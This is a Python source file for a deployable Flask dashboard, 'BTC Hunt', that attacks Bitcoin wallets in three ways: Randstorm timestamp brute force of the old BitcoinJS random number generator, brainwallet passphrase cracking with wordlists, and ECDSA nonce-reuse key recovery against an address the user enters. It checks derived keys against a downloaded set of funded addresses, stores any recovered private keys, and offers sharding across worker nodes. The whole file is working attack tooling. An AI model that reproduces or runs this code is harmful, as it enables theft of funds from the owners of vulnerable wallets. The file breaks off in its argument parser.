# btc_hunt.py — single-file Bitcoin crack dashboard for Render
"""
BTC Hunt — all viable pre-2015 Bitcoin attacks in one deployable app.

  1. Randstorm  (BitcoinJS-lib v0.1.3, 2011–2015) — timestamp brute force
  2. Brainwallet (SHA256 passphrase)            — wordlist → address
  3. Nonce Reuse (ECDSA, P2PKH/P2WPKH)         — Esplora API → algebra

Dashboard: Flask + SSE progress. Persistent disk at /data.
Dataset: auto-download from addresses.loyce.club, fallback 3xpl.com.

Deploy: gunicorn btc_hunt:app --bind 0.0.0.0:$PORT --timeout 120
"""

import os, sys, io, re, csv, gzip, json, math, time, signal
import sqlite3, threading, hashlib, struct, argparse
from pathlib import Path
from datetime import datetime, timezone
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import urlopen, Request
from urllib.parse import urljoin

import requests
from flask import Flask, request, Response, redirect, url_for

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════
DATA_DIR   = Path(os.environ.get("DISK_PATH", "/data" if os.path.isdir("/data") else "."))
DATA_DIR.mkdir(parents=True, exist_ok=True)

DB_PATH    = DATA_DIR / "btc_hunt.sqlite"
BLOOM_PATH = DATA_DIR / "funded.bloom"
ADDR_GZ    = DATA_DIR / "blockchair.tsv.gz"
RESULTS    = DATA_DIR / "results.json"

DATASET_URLS = [
    "http://addresses.loyce.club/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz",
    "https://3xpl.com/data/dumps/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz",
]
ESPLORA    = os.environ.get("ESPLORA_URL", "https://blockstream.info/api")
PORT       = int(os.environ.get("PORT", 5000))
GENESIS_TS = 1293840000000  # 2011-01-01 ms
CUTOFF_TS  = 1420070400000  # 2015-01-01 ms

# secp256k1
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


# ════════════════════════════════════════════════════════════════════
# CRYPTO PRIMITIVES
# ════════════════════════════════════════════════════════════════════
def _affine_add(p, q):
    if p is None: return q
    if q is None: return p
    x1,y1 = p; x2,y2 = q
    if x1==x2 and (y1+y2)%P==0: return None
    if p==q:
        lam=(3*x1*x1)*pow(2*y1,-1,P)%P
    else:
        lam=(y2-y1)*pow(x2-x1,-1,P)%P
    x3=(lam*lam-x1-x2)%P
    return (x3,(lam*(x1-x3)-y1)%P)

def ec_mul(k, pt=(Gx,Gy)):
    if k==0 or pt is None: return None
    k%=N; acc=None; g=pt
    while k:
        if k&1: acc=_affine_add(acc,g)
        g=_affine_add(g,g); k>>=1
    return acc

def privkey_to_compressed_pub(d):
    pt=ec_mul(d)
    if pt is None: return None
    x,y=pt
    return bytes([2+(y&1)])+x.to_bytes(32,'big')

def privkey_to_uncompressed_pub(d):
    pt=ec_mul(d)
    if pt is None: return None
    return b'\x04'+pt[0].to_bytes(32,'big')+pt[1].to_bytes(32,'big')

def sha256(b): return hashlib.sha256(b).digest()
def sha256d(b): return sha256(sha256(b))
def ripemd160(b):
    h=hashlib.new('ripemd160'); h.update(b); return h.digest()
def hash160(b): return ripemd160(sha256(b))

# Base58Check
B58='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def b58encode(b):
    n=int.from_bytes(b,'big'); out=''
    while n: n,r=divmod(n,58); out=B58[r]+out
    for x in b:
        if x==0: out='1'+out
        else: break
    return out

def b58check(payload):
    return b58encode(payload+sha256d(payload)[:4])

def p2pkh_address(pubkey, compressed=True):
    h=hash160(pubkey)
    return b58check(b'\x00'+h)

# Bech32
BECH32='qpzry9x8gf2tvdw0s3jn54khce6mua7l'
def _bech32_polymod(v):
    G=[0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]; chk=1
    for x in v:
        b=chk>>25; chk=(chk&0x1ffffff)<<5^x
        for i in range(5):
            if (b>>i)&1: chk^=G[i]
    return chk
def _bech32_hrp_expand(hrp): return [ord(x)>>5 for x in hrp]+[0]+[ord(x)&31 for x in hrp]
def _bech32_create_checksum(hrp,data):
    values=_bech32_hrp_expand(hrp)+data
    polymod=_bech32_polymod(values+[0]*6)^1
    return [(polymod>>5*(5-i))&31 for i in range(6)]
def _convertbits(data,frombits,tobits,pad=True):
    acc=0; bits=0; ret=[]; maxv=(1<<tobits)-1
    for v in data:
        acc=(acc<<frombits)|v; bits+=frombits
        while bits>=tobits:
            bits-=tobits; ret.append((acc>>bits)&maxv)
    if pad and bits: ret.append((acc<<(tobits-bits))&maxv)
    return ret
def p2wpkh_address(pubkey_compressed, hrp='bc'):
    h=hash160(pubkey_compressed)
    data=[0]+_convertbits(h,8,5)
    checksum=_bech32_create_checksum(hrp,data)
    return hrp+'1'+''.join(BECH32[d] for d in data+checksum)

def derive_addresses(privkey):
    """Return list of (label, address) for all common Bitcoin address types."""
    out=[]
    try:
        cpub=privkey_to_compressed_pub(privkey)
        upub=privkey_to_uncompressed_pub(privkey)
    except Exception:
        return out
    if cpub:
        out.append(('p2pkh_c', p2pkh_address(cpub, True)))
        out.append(('p2wpkh', p2wpkh_address(cpub)))
    if upub:
        out.append(('p2pkh_u', p2pkh_address(upub, False)))
    return out


# ════════════════════════════════════════════════════════════════════
# BLOOM FILTER
# ════════════════════════════════════════════════════════════════════
class BloomFilter:
    """Bit-array bloom over hash160 values with double hashing."""
    def __init__(self, m_bits, k):
        self.m = m_bits
        self.k = k
        self.bits = bytearray((m_bits + 7) // 8)

    @classmethod
    def create(cls, n_items, fp_rate=0.001):
        m = int(-n_items * math.log(fp_rate) / (math.log(2) ** 2))
        m = (m + 7) // 8 * 8
        k = max(1, int((m / max(n_items, 1)) * math.log(2)))
        return cls(m, k)

    def _positions(self, h160):
        h = hashlib.sha256(h160).digest()
        h1 = int.from_bytes(h[:8], 'big')
        h2 = int.from_bytes(h[8:16], 'big')
        for i in range(self.k):
            yield (h1 + i * h2) % self.m

    def add(self, h160):
        for pos in self._positions(h160):
            self.bits[pos >> 3] |= 1 << (pos & 7)

    def __contains__(self, h160):
        for pos in self._positions(h160):
            if not self.bits[pos >> 3] & (1 << (pos & 7)):
                return False
        return True

    def save(self, path):
        with open(path, 'wb') as f:
            f.write(struct.pack('<QQ', self.m, self.k))
            f.write(self.bits)

    @classmethod
    def load(cls, path):
        with open(path, 'rb') as f:
            m, k = struct.unpack('<QQ', f.read(16))
            bf = cls(m, k)
            bf.bits = bytearray(f.read())
        return bf


# ════════════════════════════════════════════════════════════════════
# DATASET
# ════════════════════════════════════════════════════════════════════
def _download(url, dest, log):
    log(f"[dl] {url}")
    try:
        r = requests.get(url, stream=True, timeout=60)
        r.raise_for_status()
        total = int(r.headers.get('content-length', 0))
        done = 0; last = 0
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(1 << 20):
                f.write(chunk); done += len(chunk)
                if total and done - last > 50 << 20:
                    last = done
                    log(f"[dl] {done/1e9:.2f}/{total/1e9:.2f} GB")
        log(f"[✓] downloaded {done/1e9:.2f} GB")
        return True
    except Exception as e:
        log(f"[!] {url}: {e}")
        return False

def build_bloom(log):
    """Download dataset if needed, stream-parse, build bloom filter."""
    if not ADDR_GZ.exists():
        ok = False
        for u in DATASET_URLS:
            if _download(u, ADDR_GZ, log): ok = True; break
        if not ok:
            raise RuntimeError("all dataset mirrors failed")

    log("[parse] streaming gzip → hash160 set")
    hash_set = set()
    n = 0
    with gzip.open(ADDR_GZ, 'rt', errors='ignore') as f:
        for line in f:
            parts = line.rstrip('\n').split('\t')
            if len(parts) < 1: continue
            addr = parts[0].strip()
            h = _address_to_hash160(addr)
            if h:
                hash_set.add(h)
                n += 1
                if n % 500000 == 0:
                    log(f"[parse] {n/1e6:.1f}M addresses, {len(hash_set)/1e6:.1f}M unique")

    log(f"[parse] {len(hash_set):,} unique hash160 — building bloom")
    bf = BloomFilter.create(len(hash_set) or 1, fp_rate=0.001)
    for h in hash_set:
        bf.add(h)
    bf.save(BLOOM_PATH)
    log(f"[✓] bloom saved ({BLOOM_PATH.stat().st_size/1e6:.0f} MB, "
        f"{bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
    return bf

def _address_to_hash160(addr):
    """Extract 20-byte hash160 from P2PKH/P2SH/Bech32 address string."""
    try:
        if addr.startswith('1') or addr.startswith('3'):
            raw = _b58decode(addr)
            if len(raw) == 25 and sha256d(raw[:21])[:4] == raw[21:]:
                return raw[1:21]
        elif addr.lower().startswith('bc1'):
            data = _bech32_decode(addr)
            if data:
                prog = _convertbits(data[1:], 5, 8, pad=False)
                if len(prog) == 20: return bytes(prog)
    except Exception:
        pass
    return None

def _b58decode(s):
    n = 0
    for c in s:
        n = n * 58 + B58.index(c)
    raw = n.to_bytes((n.bit_length()+7)//8, 'big')
    pad = len(s) - len(s.lstrip('1'))
    return b'\x00'*pad + raw

def _bech32_decode(addr):
    addr = addr.lower()
    pos = addr.rfind('1')
    if pos < 1: return None
    data = [BECH32.find(c) for c in addr[pos+1:]]
    if -1 in data: return None
    hrp = addr[:pos]
    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) != 1:
        return None
    return data[:-6]


# ════════════════════════════════════════════════════════════════════
# ATTACK 1 — RANDSTORM
# ════════════════════════════════════════════════════════════════════
class MWC1616:
    """V8-era Math.random replica (MWC1616)."""
    def __init__(self, seed):
        self.s0 = seed & 0xFFFFFFFF
        self.s1 = (seed ^ 0x5DEECE66D) & 0xFFFFFFFF
    def next(self):
        self.s0 = (18030 * (self.s0 & 0xFFFF) + (self.s0 >> 16)) & 0xFFFFFFFF
        self.s1 = (36969 * (self.s1 & 0xFFFF) + (self.s1 >> 16)) & 0xFFFFFFFF
        return ((self.s1 << 16) + self.s0) & 0xFFFFFFFF

def _rc4_init(key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def _rc4_bytes(S, n):
    i = j = 0; out = bytearray()
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def _bitcoinjs_securerandom(seed_ms):
    """Replicate BitcoinJS-lib v0.1.3 SecureRandom.nextBytes(32)."""
    rng = MWC1616(seed_ms)
    pool = bytearray(256)
    pptr = 0
    while pptr < 256:
        t = int(65536 * (rng.next() / 4294967296.0))
        pool[pptr] = (t >> 8) & 0xFF; pptr += 1
        if pptr < 256:
            pool[pptr] = t & 0xFF; pptr += 1
    pptr = 0
    def seed_int(x):
        nonlocal pptr
        for shift in (0, 8, 16, 24):
            pool[pptr] ^= (x >> shift) & 0xFF
            pptr = (pptr + 1) % 256
    seed_int(seed_ms); seed_int(seed_ms)
    # getByte initialises ArcFour with pool and seeds again
    seed_int(seed_ms); seed_int(seed_ms)
    S = _rc4_init(pool)
    return _rc4_bytes(S, 32)

def attack_randstorm(start_ms, end_ms, bf, log, job):
    """Iterate timestamp range, derive keys, check bloom."""
    total = end_ms - start_ms + 1
    log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps)")
    hits = []; t0 = time.time()
    for i, ts in enumerate(range(start_ms, end_ms + 1)):
        if job["stop"]: log("[randstorm] stopped"); break
        try:
            pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
            if pk == 0: continue
            for label, addr in derive_addresses(pk):
                h = _address_to_hash160(addr)
                if h and h in bf:
                    hit = {"ts": ts, "privkey": hex(pk), "address": addr,
                           "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit)
                    log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}")
                    _save_result("randstorm", hit)
        except Exception:
            pass
        if i % 500 == 0:
            rate = (i + 1) / max(time.time() - t0, 0.001)
            job["progress"] = (i + 1) / total
            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} ts/s  hits={len(hits)}"
    log(f"[randstorm] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 2 — BRAINWALLET
# ════════════════════════════════════════════════════════════════════
def attack_brainwallet(passphrases, bf, log, job):
    hits = []; total = len(passphrases); t0 = time.time()
    log(f"[brain] {total:,} passphrases")
    for i, pw in enumerate(passphrases):
        if job["stop"]: break
        try:
            pk = int.from_bytes(sha256(pw.encode('utf-8')), 'big') % N
            if pk == 0: continue
            for label, addr in derive_addresses(pk):
                h = _address_to_hash160(addr)
                if h and h in bf:
                    hit = {"passphrase": pw, "privkey": hex(pk),
                           "address": addr, "type": label,
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit); _save_result("brainwallet", hit)
                    log(f"  ★★★ HIT {addr}  pw={pw!r}")
        except Exception:
            pass
        if i % 200 == 0:
            rate = (i + 1) / max(time.time() - t0, 0.001)
            job["progress"] = (i + 1) / total
            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} pw/s  hits={len(hits)}"
    log(f"[brain] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 3 — NONCE REUSE
# ════════════════════════════════════════════════════════════════════
def _esplora_get(path):
    r = requests.get(f"{ESPLORA}{path}", timeout=25)
    r.raise_for_status()
    return r.text

def _parse_der_sig(sig):
    """Return (r, s, sighash_type) or None."""
    if len(sig) < 9 or sig[0] != 0x30: return None
    try:
        i = 2
        if sig[i] != 0x02: return None
        rlen = sig[i+1]; r = int.from_bytes(sig[i+2:i+2+rlen], 'big')
        i += 2 + rlen
        if sig[i] != 0x02: return None
        slen = sig[i+1]; s = int.from_bytes(sig[i+2:i+2+slen], 'big')
        i += 2 + slen
        htype = sig[i] if i < len(sig) else 1
        return r, s, htype
    except Exception:
        return None

def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
    """Bitcoin legacy SIGHASH_ALL computation."""
    try:
        # parse tx
        def varint(b, p):
            n = b[p]; p += 1
            if n < 0xfd: return n, p
            if n == 0xfd: return int.from_bytes(b[p:p+2],'little'), p+2
            if n == 0xfe: return int.from_bytes(b[p:p+4],'little'), p+4
            return int.from_bytes(b[p:p+8],'little'), p+8
        p = 0; version = raw_tx[p:p+4]; p += 4
        n_in, p = varint(raw_tx, p)
        ins = []
        for _ in range(n_in):
            start = p
            p += 36  # prev txid + vout
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            seq = raw_tx[p:p+4]; p += 4
            ins.append((raw_tx[start:start+36], script, seq))
        n_out, p = varint(raw_tx, p)
        outs = []
        for _ in range(n_out):
            val = raw_tx[p:p+8]; p += 8
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            outs.append((val, script))
        locktime = raw_tx[p:p+4]
        # replace scriptSig of input_idx with prevout_script, others empty
        out = bytearray(version)
        def put_varint(n):
            if n < 0xfd: return bytes([n])
            if n <= 0xffff: return b'\xfd' + n.to_bytes(2,'little')
            if n <= 0xffffffff: return b'\xfe' + n.to_bytes(4,'little')
            return b'\xff' + n.to_bytes(8,'little')
        out += put_varint(n_in)
        for i, (prev, script, seq) in enumerate(ins):
            out += prev
            use = prevout_script if i == input_idx else b''
            out += put_varint(len(use)) + use + seq
        out += put_varint(n_out)
        for val, script in outs:
            out += val + put_varint(len(script)) + script
        out += locktime + htype.to_bytes(4, 'little')
        return int.from_bytes(sha256d(bytes(out)), 'big')
    except Exception:
        return None

def _fetch_sigs_for_address(addr, log):
    """Fetch all (r,s,z) signatures for an address via Esplora."""
    sigs = []
    try:
        txt = _esplora_get(f"/address/{addr}/txs")
        txs = json.loads(txt)
    except Exception as e:
        log(f"[nonce] address fetch failed: {e}")
        return sigs
    log(f"[nonce] {len(txs)} transactions for {addr}")
    for tx in txs:
        txid = tx.get('txid')
        try:
            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex"))
        except Exception:
            continue
        # try legacy first
        vin = tx.get('vin', [])
        for idx, inp in enumerate(vin):
            script_sig_hex = inp.get('scriptsig', '')
            if not script_sig_hex: continue
            sig_bytes = bytes.fromhex(script_sig_hex)
            # find DER sig inside
            r_pos = sig_bytes.find(b'\x30')
            if r_pos < 0: continue
            parsed = _parse_der_sig(sig_bytes[r_pos:])
            if not parsed: continue
            r, s, htype = parsed
            prevout = inp.get('prevout', {})
            spk = prevout.get('scriptpubkey', '')
            if not spk: continue
            z = _legacy_sighash(raw, idx, bytes.fromhex(spk), htype)
            if z is None: continue
            sigs.append({"txid": txid, "r": r, "s": s, "z": z,
                         "input": idx, "type": "legacy"})
    return sigs

def attack_nonce_reuse(address, log, job):
    """Fetch sigs, group by r, recover key algebraically."""
    log(f"[nonce] target {address}")
    sigs = _fetch_sigs_for_address(address, log)
    if not sigs:
        log("[nonce] no signatures extracted")
        return []
    by_r = defaultdict(list)
    for sg in sigs:
        by_r[sg['r']].append(sg)
    dupes = {r: v for r, v in by_r.items() if len(v) > 1}
    log(f"[nonce] {len(dupes)} reused-r groups")
    hits = []
    for r, group in dupes.items():
        for a in range(len(group)):
            for b in range(a + 1, len(group)):
                s1, z1 = group[a]['s'], group[a]['z']
                s2, z2 = group[b]['s'], group[b]['z']
                den = (s1 - s2) % N
                if den == 0: continue
                try:
                    k = ((z1 - z2) * pow(den, -1, N)) % N
                    d = ((s1 * k - z1) * pow(r, -1, N)) % N
                except Exception:
                    continue
                for label, addr in derive_addresses(d):
                    hit = {"address": address, "privkey": hex(d),
                           "recovered_addr": addr, "type": label,
                           "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit); _save_result("nonce", hit)
                    log(f"  ★★★ KEY {hex(d)}  {addr}")
    log(f"[nonce] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# JOB MANAGER + SQLITE
# ════════════════════════════════════════════════════════════════════
_JOBS = {}
_JOBS_LOCK = threading.Lock()

_HITS_FILE = None  # set in worker mode: append-only JSONL of hits

def _db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.executescript("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            attack TEXT, payload TEXT, ts TEXT
        );
    """)
    return c

def _save_result(attack, payload):
    with _db() as c:
        c.execute("INSERT INTO results (attack,payload,ts) VALUES (?,?,?)",
                  (attack, json.dumps(payload), datetime.now(timezone.utc).isoformat()))
    if _HITS_FILE is not None:
        _HITS_FILE.write(json.dumps({"attack": attack, **payload}) + "\n")
        _HITS_FILE.flush()

def _list_results():
    with _db() as c:
        return [{"attack": a, "payload": json.loads(p), "ts": t}
                for a, p, t in c.execute(
                    "SELECT attack,payload,ts FROM results ORDER BY id DESC LIMIT 500")]

def _start_job(name, fn, *args):
    with _JOBS_LOCK:
        if name in _JOBS and _JOBS[name]["alive"]:
            return False, "job already running"
        job = {"progress": 0, "detail": "", "alive": True, "stop": False,
               "log": [], "started": datetime.now(timezone.utc).isoformat()}
        _JOBS[name] = job

    def log(msg):
        job["log"].append(msg)
        if len(job["log"]) > 500: job["log"] = job["log"][-500:]
        print(f"[{name}] {msg}", flush=True)

    def runner():
        try:
            fn(*args, job=job, log=log)
        except Exception as e:
            log(f"[!] {name} crashed: {e}")
        finally:
            job["alive"] = False
            job["progress"] = 1.0

    threading.Thread(target=runner, daemon=True).start()
    return True, "started"


# ════════════════════════════════════════════════════════════════════
# FLASK APP
# ════════════════════════════════════════════════════════════════════
app = Flask(__name__)

PAGE = """
<!doctype html><html><head><meta charset="utf-8">
<title>BTC Hunt</title><style>
*{box-sizing:border-box;margin:0}body{background:#0b0f14;color:#d8dee9;
font-family:ui-monospace,Menlo,monospace;padding:20px;max-width:1100px;margin:auto}
h1{color:#88c0d0;border-bottom:2px solid #3b4252;padding-bottom:8px;margin-bottom:16px}
h2{color:#81a1c1;margin:16px 0 8px}
a{color:#88c0d0;text-decoration:none;margin-right:12px}
a:hover{color:#8fbcbb}
.card{background:#1e242c;border:1px solid #3b4252;border-radius:6px;padding:14px;
margin:10px 0}
.btn{background:#5e81ac;color:#eceff4;border:none;padding:8px 16px;
border-radius:4px;cursor:pointer;font-family:inherit;font-size:14px}
.btn:hover{background:#81a1c1}.btn.danger{background:#bf616a}
input,textarea{background:#2e3440;color:#d8dee9;border:1px solid #4c566a;
padding:8px;border-radius:4px;width:100%;font-family:inherit;margin:4px 0}
label{color:#88c0d0;font-size:13px;display:block;margin-top:6px}
pre{background:#0b0f14;padding:10px;border-radius:4px;overflow:auto;
max-height:320px;font-size:12px;border:1px solid #3b4252}
.bar{background:#2e3440;border-radius:4px;height:12px;overflow:hidden;margin:6px 0}
.bar>div{background:#a3be8c;height:100%;transition:width .3s}
.hit{color:#ebcb8b;font-weight:bold}
.muted{color:#7b8794;font-size:13px}
.status-ok{color:#a3be8c}.status-bad{color:#bf616a}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px}
</style></head><body>
<h1>₿ BTC Hunt — pre-2015 attack dashboard</h1>
<p><a href="/">home</a><a href="/data">dataset</a>
<a href="/randstorm">randstorm</a><a href="/brain">brainwallet</a>
<a href="/nonce">nonce reuse</a><a href="/results">results</a></p>
<hr style="border-color:#3b4252;margin:14px 0">
{body}
</body></html>
"""

def page(body):
    return PAGE.replace("{body}", body)

@app.route("/")
def home():
    dataset = BLOOM_PATH.exists()
    body = f"""
<div class="card">
<h2>Dataset</h2>
<p>{'<span class="status-ok">✓ bloom filter ready</span>' if dataset else
'<span class="status-bad">✗ no bloom — visit /data first</span>'}</p>
</div>
<div class="grid">
<div class="card"><h2>1. Randstorm</h2>
<p class="muted">BitcoinJS-lib v0.1.3 (2011–2015) used Math.random()
instead of crypto.getRandomValues. Iterating millisecond timestamps
reproduces the private key.</p>
<a class="btn" href="/randstorm">Open</a></div>
<div class="card"><h2>2. Brainwallet</h2>
<p class="muted">SHA256(passphrase) → private key. Human passphrases
have ~40 bits of entropy. 130k pw/s against a bloom filter finds the
weak ones.</p>
<a class="btn" href="/brain">Open</a></div>
<div class="card"><h2>3. Nonce Reuse</h2>
<p class="muted">Two ECDSA signatures sharing r ⇒ recover k and d
algebraically. Fetches signatures via Blockstream Esplora.</p>
<a class="btn" href="/nonce">Open</a></div>
</div>"""
    return page(body)

@app.route("/data")
def data_page():
    status = {
        "bloom": BLOOM_PATH.exists(),
        "gz": ADDR_GZ.exists(),
        "bloom_size": BLOOM_PATH.stat().st_size if BLOOM_PATH.exists() else 0,
        "gz_size": ADDR_GZ.stat().st_size if ADDR_GZ.exists() else 0,
    }
    body = f"""
<div class="card"><h2>Dataset status</h2>
<p>blockchair.tsv.gz: {'✓ ' + f'{status["gz_size"]/1e9:.2f} GB' if status['gz']
else '✗ not downloaded'}</p>
<p>funded.bloom: {'✓ ' + f'{status["bloom_size"]/1e6:.0f} MB' if status['bloom']
else '✗ not built'}</p>
<button class="btn" onclick="fetch('/api/dataset',{{method:'POST'}})
.then(r=>r.json()).then(d=>alert(d.msg))">Download & build bloom</button>
</div>
<div class="card"><h2>Log</h2><pre id="log"></pre></div>
<script>
const es = new EventSource('/api/log/dataset');
es.onmessage = e => {{ document.getElementById('log').textContent += e.data+'\n'; }};
</script>"""
    return page(body)

@app.route("/api/dataset", methods=["POST"])
def api_dataset():
    def runner(job, log):
        try:
            build_bloom(log)
            job["progress"] = 1.0
        except Exception as e:
            log(f"[!] {e}")
    ok, msg = _start_job("dataset", runner)
    return {"ok": ok, "msg": msg}

@app.route("/randstorm")
def rs_page():
    body = """
<div class="card"><h2>Randstorm — timestamp range</h2>
<label>Start (ms since epoch)</label>
<input id="s" value="1293840000000">
<label>End (ms since epoch)</label>
<input id="e" value="1420070400000">
<p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window.
Each ms = one candidate key.</p>
<button class="btn" onclick="start()">Start</button>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const s=document.getElementById('s').value, e=document.getElementById('e').value;
  fetch('/api/randstorm',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({start:parseInt(s),end:parseInt(e)})})
  .then(r=>r.json()).then(d=>console.log(d));
}
const es=new EventSource('/api/job/randstorm');
es.onmessage=e=>{
  const d=JSON.parse(e.data);
  document.getElementById('bar').style.width=(d.progress*100)+'%';
  document.getElementById('detail').textContent=d.detail;
  if(d.log && d.log.length) document.getElementById('log').textContent=
    d.log.slice(-50).join('\\n');
};
</script>"""
    return page(body)

@app.route("/api/randstorm", methods=["POST"])
def api_rs():
    if not BLOOM_PATH.exists():
        return {"ok": False, "msg": "bloom not built"}
    bf = BloomFilter.load(BLOOM_PATH)
    j = request.get_json()
    ok, msg = _start_job("randstorm", attack_randstorm,
                          int(j["start"]), int(j["end"]), bf)
    return {"ok": ok, "msg": msg}

@app.route("/brain")
def brain_page():
    body = """
<div class="card"><h2>Brainwallet — passphrase file</h2>
<label>Upload .txt (one passphrase per line)</label>
<input type="file" id="f" accept=".txt">
<button class="btn" onclick="start()">Start</button>
<p class="muted">Try rockyou.txt, common English phrases, or
custom lists. Max ~130k pw/s against bloom.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const file=document.getElementById('f').files[0];
  if(!file){alert('pick a file');return}
  const reader=new FileReader();
  reader.onload=()=>{
    fetch('/api/brain',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({data:reader.result})})
    .then(r=>r.json()).then(d=>console.log(d));
  };
  reader.readAsText(file);
}
const es=new EventSource('/api/job/brainwallet');
es.onmessage=e=>{
  const d=JSON.parse(e.data);
  document.getElementById('bar').style.width=(d.progress*100)+'%';
  document.getElementById('detail').textContent=d.detail;
  if(d.log && d.log.length) document.getElementById('log').textContent=
    d.log.slice(-50).join('\\n');
};
</script>"""
    return page(body)

@app.route("/api/brain", methods=["POST"])
def api_brain():
    if not BLOOM_PATH.exists():
        return {"ok": False, "msg": "bloom not built"}
    bf = BloomFilter.load(BLOOM_PATH)
    lines = [ln.strip() for ln in (request.get_json().get("data") or "").splitlines()
             if ln.strip()]
    if not lines:
        return {"ok": False, "msg": "empty file"}
    ok, msg = _start_job("brainwallet", attack_brainwallet, lines, bf)
    return {"ok": ok, "msg": msg}

@app.route("/nonce")
def nonce_page():
    body = """
<div class="card"><h2>Nonce reuse — target address</h2>
<label>Bitcoin address</label>
<input id="a" placeholder="1... or bc1...">
<button class="btn" onclick="start()">Scan</button>
<p class="muted">Fetches all txs via Blockstream Esplora, finds
repeated r values, recovers the private key.</p>
</div>
<div class="card"><h2>Progress</h2>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const a=document.getElementById('a').value.trim();
  fetch('/api/nonce',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({address:a})})
  .then(r=>r.json()).then(d=>console.log(d));
}
const es=new EventSource('/api/job/nonce');
es.onmessage=e=>{
  const d=JSON.parse(e.data);
  document.getElementById('detail').textContent=d.detail;
  if(d.log && d.log.length) document.getElementById('log').textContent=
    d.log.slice(-80).join('\\n');
};
</script>"""
    return page(body)

@app.route("/api/nonce", methods=["POST"])
def api_nonce():
    addr = (request.get_json().get("address") or "").strip()
    if not addr: return {"ok": False, "msg": "no address"}
    ok, msg = _start_job("nonce", attack_nonce_reuse, addr)
    return {"ok": ok, "msg": msg}

@app.route("/results")
def results_page():
    rows = _list_results()
    body = "<div class='card'><h2>Results</h2>"
    if not rows:
        body += "<p class='muted'>no hits yet</p>"
    for r in rows:
        body += f"<div class='card'><p class='hit'>[{r['attack']}] {r['ts']}</p>" \
                f"<pre>{json.dumps(r['payload'], indent=2)}</pre></div>"
    body += "</div>"
    return page(body)

@app.route("/api/job/<name>")
def api_job_stream(name):
    def gen():
        last_log_len = 0
        while True:
            job = _JOBS.get(name)
            if not job:
                yield f"data: {json.dumps({'progress':0,'detail':'not started','log':[]})}\n\n"
                time.sleep(1); continue
            payload = {"progress": job["progress"], "detail": job["detail"],
                       "alive": job["alive"], "log": job["log"][last_log_len:]}
            last_log_len = len(job["log"])
            yield f"data: {json.dumps(payload)}\n\n"
            if not job["alive"] and last_log_len == len(job["log"]):
                yield f"data: {json.dumps({'progress':1,'detail':'done','alive':False,'log':[]})}\n\n"
                break
            time.sleep(0.5)
    return Response(gen(), mimetype="text/event-stream")

@app.route("/api/log/<name>")
def api_log_stream(name):
    return api_job_stream(name)


# ════════════════════════════════════════════════════════════════════
# ENTRY
# ════════════════════════════════════════════════════════════════════
def _shard_range(start, end, idx, n):
    """Split [start,end] into n contiguous shards; return shard idx (0-based)."""
    total = end - start + 1
    per = total // n
    s = start + idx * per
    e = end if idx == n - 1 else s + per - 1
    return s, e


if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        epilog="worker mode (for cluster nodes): "
               "python btc_hunt.py --worker randstorm --shard 3/10   "
               "# timestamps split across 10 nodes\n"
               "python btc_hunt.py --worker brainwallet --shard 3/10 --wordlist words.txt")
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--build-bloom", action="store_true")
    ap.add_argument("--cli-randstorm", nargs=2, type=int, metavar=("START","END"))
